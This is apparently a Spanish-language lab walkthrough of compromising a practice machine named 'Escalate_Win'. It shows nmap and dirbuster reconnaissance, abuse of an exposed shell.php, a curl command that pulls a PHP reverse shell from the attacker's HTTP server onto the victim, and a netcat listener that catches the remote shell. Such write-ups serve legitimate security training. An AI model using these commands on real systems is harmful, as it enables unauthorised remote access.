---
title: Pentesting Escalate_Win
published: true
---

### Reconocimiento
Escaneamos con **nmap**:
```
sudo nmap -p- -T4 [IP DE LA VÍCTIMA] -oN nmap.txt 
```
![](/images/20220513115055.png)

Vemos que la máquina tiene el puerto 80 abierto(**http**), por lo tanto, es accesible desde un navegador web:
![](/images/20220513115328.png)

Lanzamos un ataque de diccionario con **dirbuster** para descubrir que directorios hay disponibles:
![](/images/20220513120012.png) 

Detectamos un archivo que parece interesante "**shell.php**":
![](/images/20220513120328.png)

![](/images/20220513121121.png)

Como vemos se pueden ejecutar comandos a través de parametros en la url:
![](/images/20220513121252.png)  

### Exploit
Para conseguir una consola interactiva con la máquina víctima utilizamos una **shell inversa** y **netcat**:

En este caso he escogido esta, ya que es compatible con Windows: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php

Descargamos la shell a nuestra máquina con el comando **wget**:
```
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
```

Ahora editamos el código de **php_reverse_shell.php** para que conecte a nuestra máquina:
```
nano php_reverse_shell.php
```
![](/images/20220513122810.png)  
*En mi caso la ip de kali es 192.168.3.249 y utilizaré el puerto 4444*
Una vez editado guardamos con **CTRL+S** y cerramos con **CTRL+X**

Lo siguiente es iniciar un **servidor http** para poder descargar la shell en la máquina víctima:
```
sudo python3 -m http.server 80
```
![](/images/20220513123751.png)

Descargamos la shell a la máquina víctima desde el navegador utilizando **curl**:
```
http://[IP DE LA VÍCTIMA]/shell.php?cmd=curl+http://[IP DEL ATACANTE]/php_reverse_shell.php+-O+php_reverse_shell.php
```
*Si todo ha ido bien, el servidor nos contestara con una página en blanco*

Podemos ver que nuestro shell se ha subido correctamente:
```
http://[IP DE LA VÍCTIMA]/shell.php?ls+-la
```
![](/images/20220513125043.png)  
Ya podemos cerrar el servidor http en kali.

Ponemos **netcat** a la escucha en el puerto 4444:
```
nc -nlvp 4444
```
![](/images/20220513125601.png)  

Lo unico que falta es ejecutar la shell en la máquina víctima:
```
http://[IP DE LA VÍCTIMA]/php_reverse_shell.php.php
```
*Si todo va bien, el navegador se quedara cargando.*

Listo, hemos recibido una conexion en netcat que nos da acceso remoto a la máquina víctima:
![](/images/20220513130346.png)

![](/images/20220513130922.png)

A partir de aquí pasaríamos a la fase de **escalada de privilegios**.